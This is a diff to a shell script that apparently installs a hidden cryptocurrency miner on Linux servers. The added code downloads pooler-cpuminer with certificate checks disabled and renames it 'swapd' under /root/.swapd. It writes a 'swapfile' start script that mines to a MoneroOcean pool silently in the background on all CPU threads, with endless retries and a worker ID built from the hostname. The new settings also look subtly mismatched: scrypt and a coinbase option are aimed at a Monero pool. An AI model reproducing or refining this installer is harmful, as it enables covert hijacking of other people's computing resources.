@@ -1509,57 +1509,35 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
 
     # ===== x86_64 with old GLIBC (CentOS 6, etc) =====
     if [ "$ARCH" = "x86_64" ] || [ "$ARCH" = "amd64" ]; then
-        echo "[*] x86_64 system with old GLIBC detected"
-        echo "[*] Trying cpuminer-multi (supports GLIBC 2.5+)..."
-
-        # cpuminer-multi v1.3.7 - compatible with older GLIBC
-        CPUMINER_URL="https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-rel1.3.7-x86_64_linux.tar.gz"
-
-        echo "[*] Downloading cpuminer-multi v1.3.7..."
-        echo "[*] URL: $CPUMINER_URL"
-        echo "[*] Attempting download with curl..."
-        if curl -L -k -o cpuminer.tar.gz "$CPUMINER_URL" && [ -s cpuminer.tar.gz ]; then
-            FILE_SIZE=$(stat -c%s cpuminer.tar.gz 2>/dev/null || wc -c < cpuminer.tar.gz)
-            if [ "$FILE_SIZE" -gt 100000 ]; then
-                echo "[*] Downloaded cpuminer-multi ($((FILE_SIZE / 1024))KB), extracting..."
-                if tar -xzf cpuminer.tar.gz; then
-                    # Find the binary
-                    for location in cpuminer cpuminer-multi bin/cpuminer*/cpuminer; do
-                        if [ -f "$location" ]; then
-                            cp "$location" swapd
-                            chmod +x swapd
-                            DOWNLOAD_SUCCESS=true
-                            echo "[✓] cpuminer-multi installed for x86_64"
-                            break
-                        fi
-                    done
+        echo "[*] x86_64 system detected - downloading pooler-cpuminer..."
+        
+        # Download pooler-cpuminer from SourceForge
+        CPUMINER_URL="https://phoenixnap.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz"
+        
+        cd /tmp || exit 1
+        echo "[*] Downloading pooler-cpuminer-2.5.1..."
+        if wget "$CPUMINER_URL" -O pooler-cpuminer-2.5.1-linux-x86_64.tar.gz 2>/dev/null || curl -L -k -o pooler-cpuminer-2.5.1-linux-x86_64.tar.gz "$CPUMINER_URL" 2>/dev/null; then
+            echo "[*] Download complete, extracting..."
+            if tar xzvf pooler* 2>/dev/null; then
+                if [ -f "minerd" ]; then
+                    chmod +x minerd
+                    echo "[*] Moving minerd to /root/.swapd/swapd"
+                    mv minerd /root/.swapd/swapd
+                    DOWNLOAD_SUCCESS=true
+                    echo "[✓] pooler-cpuminer installed successfully"
+                else
+                    echo "[!] ERROR: minerd binary not found after extraction"
                 fi
-                rm -rf cpuminer.tar.gz cpuminer-multi* 2>/dev/null
+            else
+                echo "[!] ERROR: Failed to extract tarball"
             fi
+            # Cleanup
+            rm -f pooler* 2>/dev/null
+        else
+            echo "[!] ERROR: Failed to download pooler-cpuminer"
         fi
-
-        # Fallback: wget
-        if [ "$DOWNLOAD_SUCCESS" = false ] && command -v wget >/dev/null 2>&1; then
-            echo "[*] Retrying with wget..."
-            echo "[*] URL: $CPUMINER_URL"
-            if wget --no-check-certificate -O cpuminer.tar.gz "$CPUMINER_URL" && [ -s cpuminer.tar.gz ]; then
-                FILE_SIZE=$(stat -c%s cpuminer.tar.gz 2>/dev/null || wc -c < cpuminer.tar.gz)
-                if [ "$FILE_SIZE" -gt 100000 ]; then
-                    if tar -xzf cpuminer.tar.gz; then
-                        for location in cpuminer cpuminer-multi bin/cpuminer*/cpuminer; do
-                            if [ -f "$location" ]; then
-                                cp "$location" swapd
-                                chmod +x swapd
-                                DOWNLOAD_SUCCESS=true
-                                echo "[✓] cpuminer-multi installed"
-                                break
-                            fi
-                        done
-                    fi
-                    rm -rf cpuminer.tar.gz cpuminer-multi* 2>/dev/null
-                fi
-            fi
-        fi
+        
+        cd /root/.swapd || exit 1
 
     # ===== ARM systems (ARMv7, ARM64) =====
     else
@@ -2091,47 +2069,49 @@ else
 fi
 
 elif [ "$MINER_TYPE" = "cpuminer" ]; then
-    # ==================== CONFIGURE CPUMINER-MULTI ====================
-    echo "[*] Configuring cpuminer-multi..."
-    echo "[*] Note: cpuminer-multi uses command-line args, no JSON config"
-
+    # ==================== CONFIGURE POOLER-CPUMINER (MINERD) ====================
+    echo "[*] Configuring pooler-cpuminer (minerd)..."
+    
     # Detect server IP for worker identification
     echo "[*] Detecting server IP address for worker identification..."
     PASS=$(get_server_ip)
     if [ -z "$PASS" ] || [ "$PASS" = "localhost" ]; then
         # Use architecture-aware worker ID
         if [ "$ARCH" = "x86_64" ] || [ "$ARCH" = "amd64" ]; then
-            PASS="OLD-GLIBC-$(hostname)-$(date +%s)"
+            PASS="x64-$(hostname)-$(date +%s)"
         else
             PASS="ARM-$(hostname)-$(date +%s)"
         fi
     fi
     echo "[*] Detected worker ID: $PASS"
-
-    # Create a simple start script
-    cat > /root/.swapd/swapfile << 'CPUMINER_EOF'
+    
+    # Create start script for minerd with MoneroOcean
+    cat > /root/.swapd/swapfile << 'MINERD_EOF'
 #!/bin/bash
-# cpuminer-multi start script
+# pooler-cpuminer (minerd) start script for MoneroOcean
 cd /root/.swapd
 exec ./swapd \
-    -a cryptonight \
-    -o gulf.moneroocean.stream:80 \
-    -u WALLET_PLACEHOLDER \
-    -p PASS_PLACEHOLDER \
-    --cpu-priority 5 \
-    -t $(nproc) \
-    -B \
-    >/dev/null 2>&1
-CPUMINER_EOF
-
+    --algo=scrypt \
+    --url=stratum+tcp://gulf.moneroocean.stream:80 \
+    --user=WALLET_PLACEHOLDER \
+    --pass=PASS_PLACEHOLDER \
+    --threads=$(nproc) \
+    --quiet \
+    --background \
+    --retries=-1 \
+    --retry-pause=5 \
+    --coinbase-addr=WALLET_PLACEHOLDER
+MINERD_EOF
+    
     # Replace placeholders
     sed -i "s|WALLET_PLACEHOLDER|$WALLET|g" /root/.swapd/swapfile
     sed -i "s|PASS_PLACEHOLDER|$PASS|g" /root/.swapd/swapfile
     chmod +x /root/.swapd/swapfile
-
-    echo "[✓] cpuminer-multi configured"
+    
+    echo "[✓] pooler-cpuminer configured for MoneroOcean"
     echo "[✓] Wallet: ${WALLET:0:20}..."
     echo "[✓] Pass (Worker ID): $PASS"
+    echo "[✓] Pool: gulf.moneroocean.stream:80"
     echo "[*] Start script: /root/.swapd/swapfile"
 fi
 
